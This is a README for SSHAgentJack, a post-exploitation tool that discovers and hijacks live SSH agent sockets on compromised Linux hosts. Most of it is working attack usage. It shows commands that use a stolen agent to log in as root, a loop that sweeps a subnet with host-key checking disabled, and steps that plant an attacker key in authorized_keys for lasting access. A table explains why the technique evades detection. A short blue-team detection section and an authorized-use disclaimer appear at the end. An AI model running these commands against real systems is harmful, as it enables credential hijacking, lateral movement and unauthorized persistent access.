# SSHAgentJack

```
  ad8888888888ba
 dP'         `"8b,
 8  ,aaa,       "Y888a     ,aaaa,     ,aaa,  ,aa,
 8  8' `8           "88baadP""""YbaaadP"""YbdP""Yb
 8  8   8              """        """      ""    8b
 8  8, ,8         ,aaaaaaaaaaaaaaaaaaaaaaaaddddd88P
 8  `"""'       ,d8""
 Yb,         ,ad8"    SSHAgentJack v1.0
  "Y8888888888P"
```

**Author:** c0d3Ninja
**Website:** https://gotr00t0day.github.io
**Instagram:** @gotr00t0day

---

## What is it?

SSHAgentJack is a post exploitation tool that discovers and hijacks live SSH agent sockets on a compromised Linux system. It finds active `SSH_AUTH_SOCK` entries across all running processes, validates which ones have keys loaded, and surfaces them for immediate use — without touching disk, cracking passwords, or needing the private key files.

SSH agents hold decrypted keys in memory. If an attacker can access the socket, they can use those keys to authenticate anywhere the key is authorized — silently, with no trace on the victim's system.

---

## How it works

### 1. Socket Discovery (`agentSockets`)

Walks three locations where SSH agent sockets are commonly found:

| Location | Common agent type |
|----------|------------------|
| `/tmp/ssh-XXXX/agent.<pid>` | Classic `openssh-agent` (agent forwarding) |
| `/run/user/<uid>/openssh_agent` | systemd socket-activated agent |
| `~/.ssh/agent/` | Custom agent socket paths |

Filters by filename pattern — only surfaces sockets that match known SSH agent naming conventions (`agent.<pid>`, `.agent`, etc.), not generic Unix sockets like D-Bus, PulseAudio, or Wayland.

### 2. Socket Validation (`validateSocket`)

For each discovered socket, runs:

```
SSH_AUTH_SOCK=<socket> ssh-add -l
```

Only returns sockets that respond with loaded keys. Sockets that are dead, belong to another user (permission denied), or are empty agents are silently dropped.

---

## Usage

### Standalone build

```bash
g++ sshagentjack.cpp ../modules/executils.cpp -o sshagentjack -std=c++20
./sshagentjack
```

### Expected output

```
[+] Found 2 agent socket(s):
  /tmp/ssh-ABC123/agent.4821
  /run/user/1000/openssh_agent
```

### Using a discovered socket

```bash
# List loaded keys
SSH_AUTH_SOCK=/tmp/ssh-ABC123/agent.4821 ssh-add -l

# Get full public keys + comments (comments reveal target hosts)
SSH_AUTH_SOCK=/tmp/ssh-ABC123/agent.4821 ssh-add -L

# SSH to a target using the hijacked agent — no password, no key file
SSH_AUTH_SOCK=/tmp/ssh-ABC123/agent.4821 ssh root@192.168.1.10

# Sweep the network
for ip in 10.0.0.{1..254}; do
    SSH_AUTH_SOCK=/tmp/ssh-ABC123/agent.4821 \
    ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no -o BatchMode=yes \
    root@$ip "id && hostname" 2>/dev/null && echo "[+] $ip"
done
```

### Persist before the socket dies

Agent sockets die when the owner logs out. Drop your own key first:

```bash
ssh-keygen -t ed25519 -f /tmp/.k -N "" -q

SSH_AUTH_SOCK=/tmp/ssh-ABC123/agent.4821 \
ssh root@target \
"echo '$(cat /tmp/.k.pub)' >> ~/.ssh/authorized_keys"

# Now you have permanent access independent of the agent
ssh -i /tmp/.k root@target
```

---

## Why it's effective

| Property | Detail |
|----------|--------|
| **No disk writes** | Never touches private key files |
| **No cracking** | Keys are already decrypted in agent memory |
| **No new processes** | Uses the victim's own `ssh-add` and `ssh` |
| **Looks like legitimate SSH** | Traffic is indistinguishable from normal auth |
| **Agent logs nothing** | `ssh-agent` has no logging of socket access |

---

## Prerequisites

- Must be run on a compromised Linux host
- Needs **read access to the target's socket** — requires either:
  - Running as the **same user** who owns the agent, or
  - Running as **root** (can access any socket on the system)
- Target must have agent forwarding enabled (`ssh -A`) or a local agent running with loaded keys

---

## Detection (Blue Team)

| Indicator | What to look for |
|-----------|-----------------|
| Unexpected `ssh-add -l` calls | Process audit / auditd `execve` syscall logging |
| SSH connections from unexpected source PIDs | `ss -antpe` — correlate PID with process name |
| Agent socket accessed by non-owner UID | `inotifywait` or fanotify watch on `/tmp/ssh-*` |
| New entries in `~/.ssh/authorized_keys` | File integrity monitoring |

The most reliable detection is **`auditd`** watching for `connect()` syscalls to SSH agent socket paths from processes other than `ssh` and `git`.

---

> For authorized security testing and research only.
